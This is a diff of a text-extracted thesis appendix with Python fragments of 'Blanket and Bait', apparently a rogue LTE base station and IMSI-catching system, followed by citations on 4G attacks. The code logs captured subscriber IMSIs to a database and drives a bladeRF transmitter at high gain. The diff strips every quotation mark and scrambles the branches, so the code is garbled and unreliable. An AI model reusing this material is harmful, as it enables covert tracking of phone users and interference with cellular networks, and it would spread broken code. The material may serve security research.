 print(colored("<------------------------------! IMPORTANT
 
 27
 
-!------------------------------>\n\n",’red’))
+!------------------------------>\n\n",red))
 
 print(colored("This appears to be the first time this script has been run
 
-.",’yellow’))
+.",yellow))
 
 print(colored("We require you to become the superuser of this program.
-Therefore, we require\nyour name, IMSI and a password.",’yellow’))
+Therefore, we require\nyour name, IMSI and a password.",yellow))
 
 name=raw_input("~Name of Superuser?: ")
-print(colored("---OK",’green’))
+print(colored("---OK",green))
 imsi=raw_input("~IMSI of Admin?: ")
 while len(imsi) < 15 or len(imsi) >15 or not is_number(imsi):
 
-print(colored("You have input an invalid IMSI\n",’red’))
-print(colored("-- A valid IMSI has 15 digits...\n\n",’red’))
+print(colored("You have input an invalid IMSI\n",red))
+print(colored("-- A valid IMSI has 15 digits...\n\n",red))
 imsi=raw_input("IMSI of Admin?: ")
 
-print(colored("---OK",’green’))
-print(colored("Please choose a password between 8-16 characters.\n",’blue’)
+print(colored("---OK",green))
+print(colored("Please choose a password between 8-16 characters.\n",blue)
 
 )
 
 psswrd=getpass.getpass("~Password?: ")
 while len(psswrd) < 8 or len(psswrd) > 16:
 
-print(colored("Password does not Satisfy Requirements...\n",’red’))
+print(colored("Password does not Satisfy Requirements...\n",red))
 print(colored("$$$ Please choose a password between 8-16 characters
 
-.\n",’blue’))
+.\n",blue))
 
 psswrd=getpass.getpass("~Password?: ")
 
@@ -1464,45 +1464,45 @@ print("Confirm Your Password")
 psswrd_conf=getpass.getpass("Re-enter Password: ")
 if psswrd not in psswrd_conf:
 
-print(colored("The passwords did not match, aborting.\n",’red’))
+print(colored("The passwords did not match, aborting.\n",red))
 print("Try again.")
 
 else:
 
-print(colored("---OK",’green’))
+print(colored("---OK",green))
 print(name+", you are going to be the Superuser of this program.")
 print("--Press [return] to continue. Press any other button to
 
 abort.")
 
 ins=raw_input(">> ")
-if ins is ’’:
+if ins is :
 
 hash = pbkdf2_sha256.encrypt(psswrd, rounds=200000,
 
 salt_size=16)
 
 cur=db.cursor()
-cur.callproc(’sp_super’,(name,hash,imsi))
+cur.callproc(sp_super,(name,hash,imsi))
 result=cur.fetchall()
 print(result)
 cur.close()
-if ’New user’ in result[0][0]:
+if New user in result[0][0]:
 
-print(colored("Superuser is: "+name+".",’green’))
-print(colored("**Success.**",’blue’))
+print(colored("Superuser is: "+name+".",green))
+print(colored("**Success.**",blue))
 
-print(colored("User Exists.",’red’))
-
-else:
+print(colored("User Exists.",red))
 
 else:
 
-print(colored("Aborting procedure.",’red’))
+else:
+
+print(colored("Aborting procedure.",red))
 
 else:
 
-print(colored("---OK",’green’))
+print(colored("---OK",green))
 
 28
 
@@ -1520,23 +1520,23 @@ return False
 def addUser(db):
 
 name=raw_input("~Name of Admin?: ")
-print(colored("---OK",’green’))
+print(colored("---OK",green))
 imsi=raw_input("~IMSI of Admin?: ")
-print(colored("---OK",’green’))
+print(colored("---OK",green))
 while len(imsi) < 15 or len(imsi) >15 or not is_number(imsi):
 
-print(colored("You have input an invalid IMSI\n",’red’))
-print(colored("-- A valid IMSI has 15 digits...\n\n",’red’))
+print(colored("You have input an invalid IMSI\n",red))
+print(colored("-- A valid IMSI has 15 digits...\n\n",red))
 imsi=raw_input("IMSI of Admin?: ")
 
-print(colored("Please choose a password between 8-16 characters.\n",’blue’))
+print(colored("Please choose a password between 8-16 characters.\n",blue))
 psswrd=getpass.getpass("~Password?: ")
 while len(psswrd) < 8 or len(psswrd) > 16:
 
-print(colored("Password does not Satisfy Requirements...\n",’red’))
-print(colored("$$$ Please choose a password between 8-16 characters.\n",’
+print(colored("Password does not Satisfy Requirements...\n",red))
+print(colored("$$$ Please choose a password between 8-16 characters.\n",
 
-blue’))
+blue))
 
 psswrd=getpass.getpass("~Password?: ")
 
@@ -1544,35 +1544,35 @@ print("Confirm Your Password")
 psswrd_conf=getpass.getpass("Re-enter Password: ")
 if psswrd not in psswrd_conf:
 
-print(colored("The passwords did not match, aborting.\n",’red’))
+print(colored("The passwords did not match, aborting.\n",red))
 print("Try again.")
 
 else:
 
-print(colored("---OK",’green’))
+print(colored("---OK",green))
 print("Are you sure you want to add "+name+" as an Admin?")
 print("--Press [return] to continue. Press any other button to abort.")
 ins=raw_input(">> ")
-if ins is ’’:
+if ins is :
 
 hash = pbkdf2_sha256.encrypt(psswrd, rounds=200000, salt_size=16)
 cur=db.cursor()
-cur.callproc(’sp_admin’,(name,hash,imsi))
+cur.callproc(sp_admin,(name,hash,imsi))
 result=cur.fetchall()
-print("Database says: "+colored(result[0][0],’yellow’))
+print("Database says: "+colored(result[0][0],yellow))
 cur.close()
-if ’New user’ in result[0][0]:
+if New user in result[0][0]:
 
-print(colored("Admin: "+name+" has been added.",’green’))
-print(colored("**Success.**",’blue’))
-
-else:
+print(colored("Admin: "+name+" has been added.",green))
+print(colored("**Success.**",blue))
 
 else:
 
-print(colored("User Exists.",’red’))
+else:
 
-print(colored("Aborting procedure.",’red’))
+print(colored("User Exists.",red))
+
+print(colored("Aborting procedure.",red))
 
 29
 
@@ -1582,72 +1582,72 @@ print("Are you sure you want to delete an Admin?")
 ans=raw_input("Y/n?: ")
 if ans is "" or ans is "Y" or ans is "y":
 
-if ’Admin’ in loginSays:
+if Admin in loginSays:
 
 print("Entering Deletion State: ")
-name=raw_input(colored("Name of Admin?: ",’red’))
+name=raw_input(colored("Name of Admin?: ",red))
 if name in loginSays:
 
-print(colored("You cannot delete yourself.",’yellow’))
+print(colored("You cannot delete yourself.",yellow))
 
 else:
 
 cur=db.cursor()
-cur.callproc(’sp_findUser’,(name,))
+cur.callproc(sp_findUser,(name,))
 result=cur.fetchall()
 cur.close()
-if ’DNE’ not in result[0][0]:
+if DNE not in result[0][0]:
 
-print(colored("Authentication Required by: "+name,’
+print(colored("Authentication Required by: "+name,
 
-red’))
+red))
 
 psswrd=getpass.getpass("Password: ")
 if pbkdf2_sha256.verify(psswrd, result[0][0]):
 
 cur=db.cursor()
-cur.callproc(’sp_delAdmin’,(name,result[0][0])
+cur.callproc(sp_delAdmin,(name,result[0][0])
 
 )
 
 result=cur.fetchall()
 cur.close()
-if ’Deleted’ in result[0][0]:
+if Deleted in result[0][0]:
 
-print(colored(name+" was deleted.",’
+print(colored(name+" was deleted.",
 
-green’))
-
-else:
-
-print(colored("Wrong Password.",’red’))
-print(colored("Aborting...",’blue’))
-
-print(colored("Wrong password.",’red’))
+green))
 
 else:
 
+print(colored("Wrong Password.",red))
+print(colored("Aborting...",blue))
+
+print(colored("Wrong password.",red))
+
 else:
 
-if ’Super’ in loginSays:
+else:
 
-print(colored("User does not exist.",’red’))
-print(colored("Aborting...",’blue’))
+if Super in loginSays:
+
+print(colored("User does not exist.",red))
+print(colored("Aborting...",blue))
 
 print("Entering Superuser Deletion State: ")
-name=raw_input(colored("Name of Admin?: ",’red’))
+name=raw_input(colored("Name of Admin?: ",red))
 cur=db.cursor()
-cur.callproc(’sp_delAdminSU’,(name,))
+cur.callproc(sp_delAdminSU,(name,))
 result=cur.fetchall()
 cur.close()
-if ’Deleted’ in result[0][0]:
+if Deleted in result[0][0]:
 
-print(colored(name+" was deleted.",’green’))
+print(colored(name+" was deleted.",green))
 
 else:
 
-print(colored(result[0][0],’red’))
-print(colored("Aborting...",’blue’))
+print(colored(result[0][0],red))
+print(colored("Aborting...",blue))
 
 30
 
@@ -1657,7 +1657,7 @@ if os.getuid() == 0:
 
 print(colored("You must run this application without Root Permissions...!\n
 
---> Shutting Down.",’red’))
+--> Shutting Down.",red))
 
 else:
 
@@ -1667,27 +1667,27 @@ print("This script requires the use of a hidden database. Please enter the
 
 password for this database.")
 
-db_pass=getpass.getpass(colored("~DB Password?:",’red’))
+db_pass=getpass.getpass(colored("~DB Password?:",red))
 try:
 
 db = MySQLdb.connect(host="localhost",user="root",passwd=db_pass,db
 
 ="blanket_and_bait")
 
-print(colored("---OK",’green’))
+print(colored("---OK",green))
 startUp(db)
 loginSays=login(db)
 
 print(colored("\n\n
 
-Welcome to Blanket And Bait’s
+Welcome to Blanket And Baits
 
-Adminstrator Settings.\n\n",’green’))
+Adminstrator Settings.\n\n",green))
 
-print(colored("Press ’q’ + [return] to exit.\n\n",’blue’))
-print(colored("Type ’help’ + [return] for help using this program.\
+print(colored("Press q + [return] to exit.\n\n",blue))
+print(colored("Type help + [return] for help using this program.\
 
-n\n",’blue’))
+n\n",blue))
 
 print("
 print("
@@ -1707,18 +1707,18 @@ Please Select 1 of the options listed:\n\n")
 ***************************************")
 
 instruct=raw_input(">> ")
-if instruct is ’q’:
+if instruct is q:
 
 print("Goodbye.")
 
-while instruct is not ’q’:
+while instruct is not q:
 
-if instruct is ’1’:
+if instruct is 1:
 
 print("You have selected to add an administrator.\n")
 addUser(db)
 print("\n\n")
-elif instruct is ’2’:
+elif instruct is 2:
 
 print("You have selected to delete an administrator.\
 
@@ -1727,7 +1727,7 @@ n")
 delUser(db,loginSays)
 print("\n\n")
 
-elif instruct is ’3’:
+elif instruct is 3:
 
 print("You requested for a list of administrators.\n\
 
@@ -1735,38 +1735,38 @@ print("You requested for a list of administrators.\n\
 
 n")
 
-print(colored("\n\nAdministrators:",’yellow’))
-print(colored("********************************",’
+print(colored("\n\nAdministrators:",yellow))
+print(colored("********************************",
 
-blue’))
+blue))
 
 cur=db.cursor()
-cur.callproc(’sp_listAdmin’,())
+cur.callproc(sp_listAdmin,())
 result=cur.fetchall()
 for p_user in result:
 
-print(">> "+colored(p_user[0],’red’))
+print(">> "+colored(p_user[0],red))
 
 cur.close()
-print(colored("********************************",’
+print(colored("********************************",
 
-blue’))
+blue))
 
 print("\n\n")
-elif instruct is ’’:
+elif instruct is :
 
 print("")
 
-elif ’help’ in instruct:
+elif help in instruct:
 
-print("Welcome ^_^\n\nYou are using Blanket and Bait’
+print("Welcome ^_^\n\nYou are using Blanket and Bait
 
 s Administrator Setup.\nThis allows a user to
-bypass Blanket and Bait’s Technology. \nPlease be
+bypass Blanket and Baits Technology. \nPlease be
 
-advised that we are in testing and your ’
+advised that we are in testing and your 
 
-privileged user’ may or may not be affected by
+privileged user may or may not be affected by
 our technology.\n\n")
 
 print("
@@ -1796,7 +1796,7 @@ else:
 print("\n\n**Instruction not recognized.")
 
 instruct=raw_input(">> ")
-if instruct is ’q’:
+if instruct is q:
 db.commit()
 db.close()
 print("Goodbye.")
@@ -1806,7 +1806,7 @@ except:
 
 0.6.3 interact.py
 
-print(colored("Wrong Password. Aborting.",’red’))
+print(colored("Wrong Password. Aborting.",red))
 
 #################################
 # Imports
@@ -1985,10 +1985,10 @@ if "IMSI=" in line:
 try:
 
 #Going to extract the IMSI using Regular Expression.
-line= re.search(’IMSI=(.*?) is’,line).group(1)
+line= re.search(IMSI=(.*?) is,line).group(1)
 cur=db.cursor()
 #Executing Stored Procedure
-cur.callproc(’sp_caught’,(line,))
+cur.callproc(sp_caught,(line,))
 result=cur.fetchall()
 cur.close()
 
@@ -1996,14 +1996,14 @@ if "xists" in result[0][0]:
 
 print(outTag+colored(result[0][0] + "Known <
 
-IMSI> is: "+line+"\n\n", ’blue’))
+IMSI> is: "+line+"\n\n", blue))
 
 else:
 
 #Identifying a new IMSI.
 print(outTag+colored("Found <IMSI>: "+line+"\n
 
-\n",’green’))
+\n",green))
 
 db.commit()
 
@@ -2055,8 +2055,8 @@ def interact():
 global db
 try:
 
-print(colored("This script requires the use of a database.",’blue’))
-print(colored("Please enter the database password.",’red’))
+print(colored("This script requires the use of a database.",blue))
+print(colored("Please enter the database password.",red))
 #Connecting to Database under name "blanket_and_bait"
 try:
 
@@ -2066,7 +2066,7 @@ db = MySQLdb.connect(host="localhost",user="root",passwd=psswrd,db
 
 ="blanket_and_bait")
 
-print(colored("-OK.",’green’))
+print(colored("-OK.",green))
 print(colored("---Create FDD_lte_enodeb process.","red"))
 print(colored("---[okay] continues.","red"))
 while raw_input(">> ")!="okay":
@@ -2086,7 +2086,7 @@ pass
 
 except MySQLdb.Error as e:
 
-print(colored(e,’red’))
+print(colored(e,red))
 
 except KeyboardInterrupt:
 
@@ -2147,7 +2147,7 @@ self.samp_rate = samp_rate = 4500000
 ##################################################
 # Blocks
 ##################################################
-#self.osmosdr_sink_0 = osmosdr.sink( args="numchan=" + str(1) + " " + ’’ )
+#self.osmosdr_sink_0 = osmosdr.sink( args="numchan=" + str(1) + " " +  )
 self.osmosdr_sink_0 = osmosdr.sink( args="bladerf numchan=1" )
 #self.osmosdr_sink_0 = osmosdr.sink( args="uhd numchan=1" )
 self.osmosdr_sink_0.set_sample_rate(samp_rate)
@@ -2156,7 +2156,7 @@ self.osmosdr_sink_0.set_freq_corr(0, 0)
 self.osmosdr_sink_0.set_gain(100, 0)
 self.osmosdr_sink_0.set_if_gain(20, 0)
 self.osmosdr_sink_0.set_bb_gain(20, 0)
-self.osmosdr_sink_0.set_antenna(’’, 0)
+self.osmosdr_sink_0.set_antenna(, 0)
 self.osmosdr_sink_0.set_bandwidth(100e6, 0)
 
 self.digital_qam_mod_0 = digital.qam.qam_mod(
@@ -2314,7 +2314,7 @@ global isRunning
 isRunning=False
 return isRunning
 
-if __name__ == ’__main__’:
+if __name__ == __main__:
 
 main()
 
@@ -2645,13 +2645,13 @@ print("Error: "+str(e))
 # CLI:
 #################################################
 
-os.system(’clear’)
+os.system(clear)
 euid = os.geteuid()
 if euid != 0:
 
 print ("Script not started as root. Running sudo..")
-args = [’sudo’, sys.executable] + sys.argv + [os.environ]
-os.execlpe(’sudo’, *args)
+args = [sudo, sys.executable] + sys.argv + [os.environ]
+os.execlpe(sudo, *args)
 
 ]")
 ]")
@@ -5955,17 +5955,17 @@ return(ip_addr);
 
 Bibliography
 
-[1] A. Shaik, R. Borgaonkar, N. Asokan, V. Niemi, and J.-P. Seifert, “Practical attacks
-against privacy and availability in 4g/lte mobile communication systems,” arXiv preprint
+[1] A. Shaik, R. Borgaonkar, N. Asokan, V. Niemi, and J.-P. Seifert, Practical attacks
+against privacy and availability in 4g/lte mobile communication systems, arXiv preprint
 arXiv:1510.07563, 2015.
 
-[2] R. P. Jover, J. Lackey, and A. Raghavan, “Enhancing the security of lte networks against
+[2] R. P. Jover, J. Lackey, and A. Raghavan, Enhancing the security of lte networks against
 
-jamming attacks,” EURASIP Journal on Information Security, vol. 2014, no. 1, p. 7, 2014.
+jamming attacks, EURASIP Journal on Information Security, vol. 2014, no. 1, p. 7, 2014.
 
-[3] D. Perez and J. Pico, “A practical attack against gprs/edge/umts/hspa mobile data communi-
+[3] D. Perez and J. Pico, A practical attack against gprs/edge/umts/hspa mobile data communi-
 
-cations,” Black Hat DC, 2011.
+cations, Black Hat DC, 2011.
 
 87
 
